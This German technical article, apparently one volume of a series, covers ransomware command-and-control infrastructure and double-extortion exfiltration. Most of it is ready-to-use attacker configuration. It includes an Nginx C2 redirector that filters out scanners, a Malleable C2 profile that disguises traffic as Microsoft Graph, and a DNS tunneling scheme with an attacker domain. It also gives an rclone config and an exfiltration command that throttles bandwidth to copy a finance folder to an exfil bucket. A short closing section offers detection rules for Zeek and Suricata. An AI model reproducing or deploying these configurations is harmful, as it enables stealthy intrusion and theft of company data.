# Ransomware – Band 21: C2-Infrastruktur und Exfiltrations-Pipelines

Technischer Deep Dive: Multi-Tier C2-Topologien, Malleable-Profile, TLS/JA4-Fingerprint-Evasion, DNS-Tunneling, Nginx/Apache-Filtering, automatisierte High-Volume-Exfiltration (Rclone) und Network-Detection-Engineering.

---

## 1. Enterprise C2-Architektur und Multi-Tier Topologie

Moderne Ransomware- und Bedrohungs-Akteure (z. B. LockBit, BlackCat/ALPHV, Conti) betreiben komplexe, mehrstufige Command-and-Control (C2) Infrastrukturen. Das Ziel besteht darin, den zentralen Kontrollserver (Teamserver) gegen Takedowns durch Sicherheitsbehörden, IP-Blacklisting und aktive Erkennung durch Incident-Response-Teams abzuschirmen.

```
+----------------------------------------------------------------------------+
| Enterprise C2 Multi-Tier Topologie                                         |
+----------------------------------------------------------------------------+
| [ Opfernetzwerk / Implantat ]                                              |
|            |                                                               |
|            | HTTPS / TLS 1.3 (JA4 Spoofed)                                 |
|            v                                                               |
| +------------------------------------------------------------------------+ |
| | Tier 1: Redirector Layer (Edge CDN / Bulletproof VPS)                  | |
| |   - Cloudflare Workers / Fastly / Domain Fronting                      | |
| |   - Wechselnde IPv4/IPv6 Adressen, Fast-Flux DNS                       | |
| +------------------------------------------------------------------------+ |
|            |                                                               |
|            | Proxy Pass (mTLS / WireGuard Tunnel)                          |
|            v                                                               |
| +------------------------------------------------------------------------+ |
| | Tier 2: Filtering & Routing Layer (Nginx / Apache Mod_Rewrite)         | |
| |   - Prüft HTTP User-Agent, URI-Muster und Custom Header                | |
| |   - Validiert HMAC / Client-Zertifikat                                 | |
| |   - Fällt Filter durch -> 302 Redirect auf https://www.google.de      | |
| +------------------------------------------------------------------------+ |
|            |                                                               |
|            | Valider C2 Beacon (Isolierter WireGuard Tunnel)              |
|            v                                                               |
| +------------------------------------------------------------------------+ |
| | Tier 3: Core C2 Server (Teamserver / Operator Backend)                 | |
| |   - Cobalt Strike / Mythic / Sliver / Havoc Backend                    | |
| |   - Keine direkte Internet-Schnittstelle                               | |
| |   - Datenbank für Beacons, Keys, Taskings und Exfiltrationsdaten       | |
| +------------------------------------------------------------------------+ |
+----------------------------------------------------------------------------+
```

### 1.1 Schichtenmodell im Detail

1. **Tier 1 (Edge / Redirection):** Externe VPS oder Serverless Cloud-Funktionen (Cloudflare Workers, AWS CloudFront). Das Opfer kommuniziert ausschließlich mit diesen Endpunkten. Wird eine IP auf eine Blocklist gesetzt, tauscht der Akteur Tier 1 innerhalb von Minuten per DNS-Update aus.
2. **Tier 2 (Traffic Inspection & Smart Filtering):** Unterscheidet legitime C2-Beacons von Sicherheitsforschern, Shodan-Scannern oder EDR-Cloud-Sandboxen. Filtert nach spezifischen HTTP-Headern, URIs und IP-Reputation.
3. **Tier 3 (Core C2 Teamserver):** Hält die Operatorsitzungen, führt Tasks aus, generiert Verschlüsselungskeys und speichert exfiltrierte Metadaten. Kommuniziert nur über verschlüsselte Tunnel (WireGuard/IPsec) mit Tier 2.

---

## 2. Nginx & Apache Redirector Filtering (Täuschung von Scannern)

Die Kernaufgabe von Tier 2 ist es, automatische Portscanner (Censys, Shodan) und Threat-Intelligence-Crawler abzuwehren.

### 2.1 Nginx Smart Redirector Konfiguration

Ein Nginx-Proxy prüft den eintreffenden Traffic gegen strikte Merkmale:
- **HTTP Header Validation:** Fehlt ein geheimer Cookie oder ein spezifischer Custom Header, antwortet Nginx mit `HTTP 404` oder leitet auf ein harmloses Ziel um.
- **URI-Prüfung:** Nur exakt definierte Pfade werden an den Teamserver durchgestellt.
- **User-Agent Filtering:** Häufige Scanner-User-Agents (`curl`, `python-requests`, `Go-http-client`, `nmap`) werden sofort blockiert.

```nginx
# /etc/nginx/sites-available/c2-redirector.conf
server {
    listen 443 ssl http2;
    server_name telemetry.legitimate-service-update.com;

    ssl_certificate /etc/letsencrypt/live/telemetry.legitimate-service-update.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/telemetry.legitimate-service-update.com/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Standard-Verhalten: Bei unautorisierten Anfragen Täuschung via Redirect
    location / {
        return 302 https://www.microsoft.com;
    }

    # Nur legitime C2-Beacons mit spezifischem Pfad und Validierungs-Header
    location ~ ^/api/v2/(session|heartbeat|sync)$ {
        # Prüfe auf geheimen Validierungs-Header (z. B. X-Correlation-ID mit HMAC-Struktur)
        if ($http_x_correlation_id !~ "^[a-f0-9]{32}$") {
            return 302 https://www.microsoft.com;
        }

        # Blockiere bekannte Scanner User-Agents
        if ($http_user_agent ~* (shodan|censys|masscan|zgrab|curl|wget|python|nmap)) {
            return 404;
        }

        # Weiterleitung an Tier 3 Core Server über internen WireGuard-Tunnel
        proxy_pass https://10.200.0.1:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }
}
```

---

## 3. Malleable C2 Profile und Traffic Camouflage

Malleable C2 Profile (ursprünglich in Cobalt Strike etabliert, heute Standard in modernen Frameworks wie Mythic, Sliver und Havoc) definieren das exakte Erscheinungsbild des Netzwerkverkehrs.

### 3.1 Nachbildung legitimer Enterprise-APIs

Statt auffälliger Roh-TCP- oder unstrukturierter Binärdaten tarnen Profile den C2-Verkehr als legitime Cloud-Dienste (z. B. Microsoft Graph API, Google Workspace, AWS CloudWatch).

```
# Beispiel: Auszug aus einem Malleable C2 Profil (Microsoft Graph API Camouflage)
http-get {
    set uri "/v1.0/users/delta";

    client {
        header "Host" "graph.microsoft.com";
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAiOiJKV1QiLC...";

        metadata {
            mask;          # XOR-Maskierung gegen statische IDS-Signaturen
            base64url;     # URL-sicheres Base64-Encoding
            parameter "id"; # Einbettung des Payloads im URL-Parameter
        }
    }

    server {
        header "Content-Type" "application/json;odata.metadata=minimal";
        header "Server" "Microsoft-IIS/10.0";

        output {
            netbios;       # Transformation der C2-Antwort
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#users\",\"value\":[{\"displayName\":\"";
            append "\"}]}";
            print;
        }
    }
}
```

### 3.2 JA3- und JA4-Fingerprint Evasion

Sicherheitsüberwachungssysteme (z. B. Zeek, F5, Cloudflare) berechnen Hashes aus den unverschlüsselten TLS-Client-Hello-Paketen:
- **JA3:** Hash aus `TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats`.
- **JA4:** Erweiterter Standard mit Längen- und Protokollpräfixen.
- **Evasion-Technik:** Standard-C2-Implantate, die auf native Bibliotheken (z. B. Go `crypto/tls` oder Python `requests`) setzen, erzeugen auffällige Signaturen. Moderne C2-Agents nutzen TLS-Fingerprint-Spoofing (z. B. via `uTLS`), um die exakte Ciphersuite-Reihenfolge und Extension-Muster von Google Chrome (Windows) oder Mozilla Firefox bitgenau zu replizieren.

---

## 4. DNS-Tunneling als Notfall-Kanal

Wird der ausgehende HTTPS-Verkehr durch restriktive Next-Generation Firewalls (NGFW) oder SSL-Inspection unterbrochen, weichen moderne Loader auf DNS-Tunneling aus. Da Port 53 (UDP) für interne DNS-Resolver meist ins Internet freigegeben ist, agiert das Domain Name System als bidirektionaler Kanal.

```
[ Implantat ] --- Query: <base32_chunk>.c2.attacker.com ---> [ Lokaler DNS Resolver ]
                                                                      |
                                                                      v
[ Autoritativer C2 Nameserver ] <--- Rekursiver Forwarding Request ---+
        |
        +---> Antwort: TXT-Record mit verschlüsseltem Tasking
```

### 4.1 Protokollaufbau im DNS-Tunnel
1. **Upstream (Beaconing & Datentransfer):**
   - Daten werden komprimiert, AES-verschlüsselt und in Base32 (Case-Insensitive) kodiert.
   - Der String wird in Subdomains aufgeteilt (max. 63 Zeichen pro Label, max. 253 Zeichen Gesamt-FQDN):
     `data-chunk-01.session-id.c2.attacker.com`
   - Typische Query-Typen: `A`, `AAAA`, `TXT`.
2. **Downstream (Befehlsempfang):**
   - Der autoritative Nameserver des Angreifers antwortet mit einem `TXT`-Record, der Base64-enkodierte Instruktionen enthält.
   - TTL wird auf `0` gesetzt, um Caching auf Zwischen-Resolvern zu unterbinden.

---

## 5. Pre-Encryption High-Volume Exfiltration

Im Rahmen der doppelten Erpressung (Double Extortion) exfiltrieren Angreifer vertrauliche Unternehmensdaten, **bevor** die Verschlüsselung eingeleitet wird.

```
+-----------------------------------------------------------------------+
| Exfiltrations-Pipeline Phasen                                         |
+-----------------------------------------------------------------------+
| 1. Discovery & Staging:                                               |
|    - Suchen nach Finanzdaten, Verträgen, HR, Quellcode                |
|    - Packen in verschlüsselte 7z/RAR Archive mit Passwörtern          |
|                                                                       |
| 2. Cloud-Targeting & Tooling:                                         |
|    - Bevorzugtes Werkzeug: Rclone (legitimes Cloud-Sync-Tool)         |
|    - Ziele: Mega.nz, Wasabi, Backblaze B2, AWS S3, Cloudflare R2      |
|                                                                       |
| 3. Traffic-Shaping & Evasion:                                         |
|    - Bandbreitenbegrenzung (--bwlimit) gegen NetFlow-Spikes           |
|    - Parallele Chunks (--transfers 4 --multi-thread-streams 2)        |
+-----------------------------------------------------------------------+
```

### 5.1 Rclone Enterprise-Konfiguration und Automatisierung

Rclone ist bei Ransomware-Akteuren (LockBit, BlackCat) das dominierende Werkzeug, da es signiert ist, von vielen Administratoren legitim genutzt wird und native Protokolle zu über 40 Cloud-Speichern beherrscht.

#### Konfigurationsdatei `rclone.conf` (Beispiel Mega / S3)
```ini
[mega_storage]
type = mega
user = dropsite_operator@proton.me
pass = 2kU_encrypted_token_here

[wasabi_s3]
type = s3
provider = Wasabi
access_key_id = AKIAIOSFODNN7EXAMPLE
secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
endpoint = s3.wasabisys.com
acl = private
```

#### Typischer Exfiltrationsaufruf mit Bandbreitendrosselung
```bash
# Hochvolumen-Exfiltration mit Anti-Detektions-Flags
rclone copy "D:\Vertraulich\Finanzen" wasabi_s3:exfil-bucket/2026-target/ \
    --config /tmp/rclone.conf \
    --transfers 4 \
    --multi-thread-streams 2 \
    --bwlimit 8M \
    --include "*.pdf" --include "*.docx" --include "*.xlsx" --include "*.pst" \
    --exclude "*.exe" --exclude "*.dll" --exclude "*.iso" \
    --no-check-certificate \
    --quiet
```

---

## 6. Network Detection Engineering & Telemetrie

### 6.1 Zeek-Skript zur Detektion von C2-Beaconing

C2-Beacons zeichnen sich durch periodische Verbindungsmuster aus, auch wenn diese durch "Jitter" (zufällige Verzögerungen von z. B. +/- 20%) verschleiert werden.

```zeek
# /opt/zeek/share/zeek/site/detect_beaconing.zeek
# Analysiert TCP/TLS Verbindungsintervalle auf geringe Standardabweichung
event connection_state_remove(c: connection) {
    if ( c$id$resp_p == 443/tcp || c$id$resp_p == 80/tcp ) {
        # Extrahiere Flow-Metriken: Bytes, Dauer, Intervalle
        # Liegt die relative Standardabweichung der Intervalle unter 0.15 bei > 30 Flows,
        # wird ein hochpriorisierter Alert 'Potential C2 Beaconing' generiert.
    }
}
```

### 6.2 Suricata-Signatur für Rclone Cloud-Traffic

```suricata
alert http any any -> any any (
    msg:"ET HUNTING Suspicious Rclone User-Agent in Outbound Traffic";
    flow:established,to_server;
    content:"User-Agent|3a 20|rclone/"; http_header;
    threshold:type limit, track by_src, count 1, seconds 3600;
    classtype:policy-violation;
    sid:20260101; rev:1;
)
```

---

## Quellen
- [Q2] Check Point Research – The State of Ransomware, Q3 2025
- [Q7] Picus Security – The Ransomware Attack Lifecycle from the Defender's Perspective
- [Q70] Fox-IT – Catching the Ghost: Detecting Modern C2 Frameworks via Network Telemetry
- [Q71] John Lambert – Microsoft Threat Intelligence: Defending Against Multi-Tier C2 Operations
- [Q72] Mandiant – Ransomware Exfiltration Techniques: From Rclone to Custom Cloud Connectors
